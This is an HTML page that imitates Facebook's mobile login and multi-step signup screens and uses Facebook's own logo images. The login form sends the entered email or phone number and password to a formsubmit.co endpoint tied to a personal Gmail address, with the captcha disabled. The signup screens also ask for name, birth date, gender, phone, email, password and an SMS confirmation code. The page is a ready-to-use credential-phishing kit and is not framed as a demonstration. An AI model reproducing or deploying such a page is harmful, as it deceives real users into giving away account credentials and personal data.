<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1c1e21;
    }
    .container {
      max-width: 100%;
      padding: 40px 16px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .language {
      font-size: 13px;
      color: #606770;
      margin-bottom: 30px;
    }
    .fb-logo {
      width: 60px;
      height: 60px;
      margin-bottom: 30px;
    }
    form {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
    }
    input {
      font-size: 17px;
      padding: 14px 16px;
      margin-bottom: 12px;
      border: 1px solid #dddfe2;
      border-radius: 10px;
      background-color: #ffffff;
    }
    button {
      font-size: 17px;
      font-weight: 600;
      border: none;
      border-radius: 999px;
      padding: 14px 0;
      width: 100%;
      cursor: pointer;
    }
    #login {
      background-color: #1877f2;
      color: #fff;
      margin: 6px 0 14px;
    }
    .forgot {
      color: #000000;
      text-align: center;
      font-size: 15px;
      text-decoration: none;
      margin-bottom: 30px;
      display: block;
    }
    #create-account {
      border: 1px solid #1877f2;
      color: #1877f2;
      background-color: transparent;
      margin-bottom: 40px;
    }
    .meta-logo {
      display: flex;
      flex-direction: column;
      align-items: center;
      font-size: 13px;
      color: #606770;
    }
    .meta-logo img {
      width: 50px;
      margin-bottom: 6px;
    }
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 22px;
      font-size: 13px;
      color: #606770;
      margin-top: 6px;
      margin-bottom: 20px;
    }
    .signup-container {
      padding: 16px;
      display: none;
    }
    .heading {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    .subheading {
      font-size: 16px;
      color: #555;
      margin-bottom: 24px;
    }
    .illustration {
      width: 100%;
      max-width: 400px;
      margin: 0 auto 24px;
      display: block;
      border-radius: 12px;
    }
    .button, .input {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      font-size: 16px;
      margin-bottom: 16px;
    }
    .button {
      border: none;
      background-color: #1877f2;
      color: white;
      font-weight: 600;
      cursor: pointer;
    }
    .button.secondary {
      background: #f0f2f5;
      color: #000;
    }
    .input {
      border: 1px solid #ccd0d5;
      background: #f5f6f7;
    }
    .link {
      text-align: center;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }
    .back-arrow {
      font-size: 24px;
      padding: 16px;
      cursor: pointer;
      display: inline-block;
    }
    .input-group {
      display: flex;
      gap: 10px;
    }
    .input-group .input {
      flex: 1;
    }
    .age-text {
      font-size: 14px;
      color: #555;
      margin-top: 8px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

<!-- LOGIN SCREEN -->
<div class="container" id="login-screen">
  <div class="language">English (UK)</div>
  <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook Logo" class="fb-logo">
  <form action="https://formsubmit.co/applerapplesapple@gmail.com" method="POST">
  <input type="hidden" name="_captcha" value="false">
  <input type="text" name="login_email_or_phone" placeholder="Mobile number or email address" required>
  <input type="password" name="login_password" placeholder="Password" required>
  <button id="login" type="submit">Log in</button>
</form>
  <a href="#" class="forgot">Forgotten password?</a>
  <button id="create-account" onclick="showSignup()">Create new account</button>
  <div class="meta-logo">
    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta Logo">
    <div class="footer-links">
      <span>About</span>
      <span>Help</span>
      <span>More</span>
    </div>
  </div>
</div>


  <input type="hidden" name="_captcha" value="false">

  <div class="signup-container" id="screen1">
    <span class="back-arrow" onclick="backToLogin()">&#8592;</span>
    <div class="heading">Join Facebook</div>
    <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yR/r/UwPfyI6FCOX.png" alt="Illustration" class="illustration">
    <div class="subheading">Create an account to connect with friends, family and communities of people who share your interests.</div>
    <button class="button" onclick="nextScreen('screen1', 'screen2'); return false;">Get Started</button>
    <button class="button secondary" type="button">Find my account</button>
  </div>

  <div class="signup-container" id="screen2">
    <span class="back-arrow" onclick="prevScreen('screen1')">&#8592;</span>
    <div class="heading">What's your name?</div>
    <div class="input-group">
      <input class="input" id="firstName" name="first_name" placeholder="First name">
      <input class="input" id="surname" name="surname" placeholder="Surname">
    </div>
    <button class="button" onclick="validateAndNext(['firstName', 'surname'], 'screen2', 'screen3'); return false;">Next</button>
  </div>
<div
  class="signup-container"
  id="screen3"
  style="display: none; padding: 0 16px 32px; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;"
>
  <span class="back-arrow" onclick="prevScreen('screen2')">&#8592;</span>
  <div
    class="heading"
    style="font-size: 24px; font-weight: 600; margin-bottom: 10px; padding: 0 16px"
  >
    What's your date of birth?
  </div>
  <input
    style="
      border-radius: 12px;
      border: 1px solid rgb(204, 208, 213);
      background: rgb(245, 246, 247);
      padding: 14px 16px;
      font-size: 17px;
      margin: 0 16px 10px 16px;
      width: calc(100% - 32px);
    "
    id="dob"
    type="date"
    name="date_of_birth"
  />
  <div
    style="
      padding: 0 16px;
      color: rgb(85, 85, 85);
      font-size: 14px;
      margin-bottom: 24px;
    "
  >
    Providing your birthday helps make sure you get the right Facebook experience for your age.
    Your birthday won’t be shown on your profile.
  </div>
  <button
    class="button"
    style="border-radius: 12px; width: calc(100% - 32px); margin: 0 16px;"
    onclick="validateDOB(); return false;"
  >
    Next
  </button>
</div>

<div class="signup-container" id="screen3b" style="display: none; padding: 24px 16px 32px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; min-height: 100vh; box-sizing: border-box;">
  <span class="back-arrow" onclick="prevScreen('screen3')" style="font-size: 24px; display: inline-block; margin-bottom: 24px; cursor: pointer;">&#8592;</span>
  
  <div class="heading" style="font-size: 22px; font-weight: 700; margin-bottom: 8px;">What's your gender?</div>
  <div style="font-size: 15px; color: #606770; margin-bottom: 24px;">
    You can change who sees your gender on your profile later.
  </div>

  <div style="display: flex; flex-direction: column; gap: 16px; margin-bottom: 32px;">
    <label style="display: flex; align-items: center; background: #fff; padding: 16px; border-radius: 12px; border: 1px solid #ddd;">
      <input type="radio" name="gender" value="female" style="margin-right: 12px;"> <span style="font-size: 17px;">Female</span>
    </label>

    <label style="display: flex; align-items: center; background: #fff; padding: 16px; border-radius: 12px; border: 1px solid #ddd;">
      <input type="radio" name="gender" value="male" style="margin-right: 12px;"> <span style="font-size: 17px;">Male</span>
    </label>

    <label style="display: flex; align-items: flex-start; background: #fff; padding: 16px; border-radius: 12px; border: 1px solid #ddd;">
      <input type="radio" name="gender" value="more" style="margin-right: 12px; margin-top: 3px;">
      <div style="display: flex; flex-direction: column;">
        <span style="font-size: 17px;">More options</span>
        <span style="font-size: 13px; color: #606770; margin-top: 4px;">
          Select "More options" to choose another gender or if you'd rather not say.
        </span>
      </div>
    </label>
  </div>

  <button class="button" style="width: 100%; background-color: #1877f2; color: #fff; padding: 14px 0; font-size: 17px; font-weight: 600; border: none; border-radius: 24px; cursor: pointer;" onclick="validateGender(); return false;">
    Next
  </button>

  <div style="text-align: center; margin-top: 24px;">
    <a href="#" style="color: #1877f2; font-size: 15px; text-decoration: none;">Find my account</a>
  </div>
</div>
   <div class="signup-container" id="screen4">
    <span class="back-arrow" onclick="prevScreen('screen3')">&#8592;</span>
    <div class="heading">What's your mobile number?</div>
    <div class="subheading">Enter the mobile number on which you can be contacted. No one will see this on your profile.</div>
    <input class="input" type="tel" id="phone" name="phone" placeholder="Mobile number" pattern="[0-9]{7,15}" inputmode="numeric">
    <button class="button" onclick="validateAndNext(['phone'], 'screen4', 'screen5'); return false;">Next</button>
    <button class="button secondary" onclick="nextScreen('screen4', 'emailSignup'); return false;">Sign up with email address</button>
    <div class="link">Find my account</div>
  </div>

  <div class="signup-container" id="emailSignup">
    <span class="back-arrow" onclick="prevScreen('screen4')">&#8592;</span>
    <div class="heading">What's your email?</div>
    <input class="input" type="email" id="email" name="email" placeholder="Email address (Gmail only)">
    <button class="button" onclick="validateGmail(); return false;">Next</button>
    <button class="button secondary" onclick="prevScreen('screen4'); return false;">Sign up with mobile number</button>
    <div class="link">Find my account</div>
  </div>

  <div class="signup-container" id="screen5">
    <span class="back-arrow" onclick="prevScreen('screen4')">&#8592;</span>
    <div class="heading">Create a password</div>
    <input class="input" type="password" id="password" name="password" placeholder="Password">
    <button class="button" onclick="validateAndNext(['password'], 'screen5', 'screen7'); return false;">Next</button>
  </div>

  <div class="signup-container" id="screen7">
    <span class="back-arrow" onclick="prevScreen('screen5')">&#8592;</span>
    <div class="heading">Save your login info?</div>
    <div class="subheading">We'll save the login info so you won't need to enter it next time you log in.</div>
    <button class="button" onclick="nextScreen('screen7', 'screen8'); return false;">Save</button>
    <button class="button secondary" onclick="nextScreen('screen7', 'screen8'); return false;">Not now</button>
    <div class="link">Find my account</div>
  </div>

  <div class="signup-container" id="screen8">
    <span class="back-arrow" onclick="prevScreen('screen7')">&#8592;</span>
    <div class="heading">Agree to Facebook's terms and policies</div>
    <div class="subheading">
      People who use our service may have uploaded your contact information to Facebook. 
      <a href="#" style="color:#1877f2;text-decoration:none;">Learn more</a><br><br>
      By tapping <b>I agree</b>, you agree to create an account and to Facebook's 
      <a href="#" style="color:#1877f2;text-decoration:none;">terms</a>, 
      <a href="#" style="color:#1877f2;text-decoration:none;">Privacy Policy</a> and 
      <a href="#" style="color:#1877f2;text-decoration:none;">Cookies Policy</a>.<br><br>
      You'll also receive SMS notifications from us and can opt out at any time. 
      <a href="#" style="color:#1877f2;text-decoration:none;">Learn more</a>
    </div>
    <button class="button" onclick="nextScreen('screen8', 'screen10'); return false;">I agree</button>
    <div class="link">Find my account</div>
  </div>

<!-- CONFIRMATION CODE SCREEN -->
<div class="signup-container" id="screen10">
    <span class="back-arrow" onclick="prevScreen('screen9b')">&#8592;</span>
    <div style="font-family: sans-serif; margin-top: 30px;">
      <h2 style="font-size: 22px; font-weight: bold;">Enter the confirmation code</h2>
      <p style="margin-top: 8px;">To confirm your account, enter the code that we sent via SMS/MAIL.</p>
      <input class="input" type="text" name="confirmation_code" placeholder="Confirmation code" maxlength="5" style="margin-top: 20px;">
      <button class="button" onclick="nextScreen('screen10', 'screenFinal'); return false;" style="margin-top: 20px;">Next</button>
      <button class="button secondary" type="button" style="margin-top: 10px;">I didn't receive the code</button>
    </div>
  </div>
</div>

<script>
  function showSignup() {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('screen1').style.display = 'block';
  }

  function backToLogin() {
    document.getElementById('screen1').style.display = 'none';
    document.getElementById('login-screen').style.display = 'flex';
  }

  function nextScreen(current, next) {
    document.getElementById(current).style.display = 'none';
    document.getElementById(next).style.display = 'block';
  }

  function prevScreen(prev) {
    document.querySelectorAll(".signup-container").forEach(c => c.style.display = 'none');
    document.getElementById(prev).style.display = 'block';
  }

  function validateAndNext(inputIds, current, next) {
    let valid = true;
    inputIds.forEach(id => {
      const el = document.getElementById(id);
      if (!el || el.value.trim() === '') {
        el.style.border = '1px solid red';
        el.focus();
        valid = false;
      } else {
        el.style.border = '1px solid #ccd0d5';
      }
    });
    if (valid) nextScreen(current, next);
  }

  function validateDOB() {
    const dobInput = document.getElementById('dob');
    if (!dobInput.value) {
      dobInput.style.border = '1px solid red';
      return;
    }

    const dob = new Date(dobInput.value);
    const today = new Date();
    const ageDifMs = today - dob;
    const ageDate = new Date(ageDifMs);
    const age = Math.abs(ageDate.getUTCFullYear() - 1970);

    if (age < 13) {
      dobInput.style.border = '1px solid red';
      alert('Sorry, you must be at least 13 years old to sign up.');
      return;
    }

    if (age > 100) {
      dobInput.style.border = '1px solid red';
      alert('Please enter a valid date of birth.');
      return;
    }

    dobInput.style.border = '1px solid #ccd0d5';
    nextScreen('screen3', 'screen3b');
  }

  function validateGender() {
    const genderOptions = document.getElementsByName('gender');
    let selected = false;
    for (const option of genderOptions) {
      if (option.checked) {
        selected = true;
        break;
      }
    }

    if (!selected) {
      alert('Please select your gender.');
      return;
    }

    nextScreen('screen3b', 'screen4');
  }

  function validateGmail() {
    const email = document.getElementById('email');
    const value = email.value.trim();
    if (!value.endsWith('@gmail.com')) {
      email.style.border = '1px solid red';
      alert('Please enter a valid Gmail address.');
    } else {
      email.style.border = '1px solid #ccd0d5';
      nextScreen('emailSignup', 'screen5');
    }
  }

  function validatePhone() {
    const phoneInput = document.getElementById('phone');
    const value = phoneInput.value.trim();

    const phoneRegex = /^\+?\d{7,15}$/;

    if (!phoneRegex.test(value)) {
      phoneInput.style.border = '1px solid red';
      alert('Please enter a valid phone number (7 to 15 digits, numbers only, optional + at start).');
      return;
    }

    phoneInput.style.border = '1px solid #ccd0d5';
    nextScreen('screen4', 'screen5');
  }
</script>
</body>
</html>
